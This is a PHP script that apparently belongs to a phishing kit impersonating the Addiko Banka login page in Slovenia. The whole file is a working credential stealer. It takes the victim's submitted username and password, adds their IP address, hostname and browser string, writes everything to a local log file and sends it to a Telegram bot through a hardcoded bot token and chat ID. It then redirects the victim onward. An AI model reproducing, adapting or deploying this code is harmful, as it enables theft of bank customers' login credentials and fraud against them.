<?php
 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$msg .= "Addiko Login - ".$ip."\n";
$msg .= "\n";
$msg .= "👨‍⚕️	Username	: ".$_POST['username']."\n";
$msg .= "🔐	Password	: ".$_POST['password']."\n";
$msg .= "\n";
$msg .= "🇸🇮	Country	: Slovenia\n";
$msg .= "📍	IP	: ".$ip."\n";
$msg .= "🌍	HostName	: ".$hostname."\n";
$msg .= "🛡️  UserAgent: ".$u_agent."\n";
$msg .= "...................Addiko Banka......................\n";
$fp = fopen("telegram.txt","a");
fputs($fp,$msg);
fclose($fp);


$botToken="5953597884:AAEVjnZe2mn1mZSeh2sxJrS2OQ13Lf0h8c4";

    $website="https://api.telegram.org/bot".$botToken;
    $chatId=1598837629;  //** ===>>>NOTE: this chatId MUST be the chat_id of a person, NOT another bot chatId !!!**
    $params=[
        'chat_id'=>$chatId, 
        'text'=>$msg,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

header("Location:  process.php");  

?>
 